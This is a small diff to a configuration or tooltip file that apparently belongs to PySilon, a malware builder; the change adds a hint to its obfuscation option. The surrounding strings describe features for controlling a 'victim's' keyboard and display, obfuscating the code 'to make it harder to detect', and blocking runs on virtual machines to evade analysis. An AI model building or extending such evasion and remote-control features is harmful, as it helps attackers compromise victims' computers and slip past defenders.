@@ -206,7 +206,7 @@
         "jmpscar": "Kinda nothing to add here.", 
         "keystrk": "Type words using your victim's keyboard.", 
         "scrnman": "Manipulate computer's graphics and display basically anything.",
-        "obfuscation": "Obfuscate PySilon's code to make it harder to detect.",
+        "obfuscation": "Obfuscate PySilon's code to make it harder to detect (double-click for advanced settings).",
         "anti_vm": "Prevent PySilon from running on VMs (double-click for advanced settings).",
         "advanced_antivm": {
             "FilesCheck": "Check for VM-typical system files.",
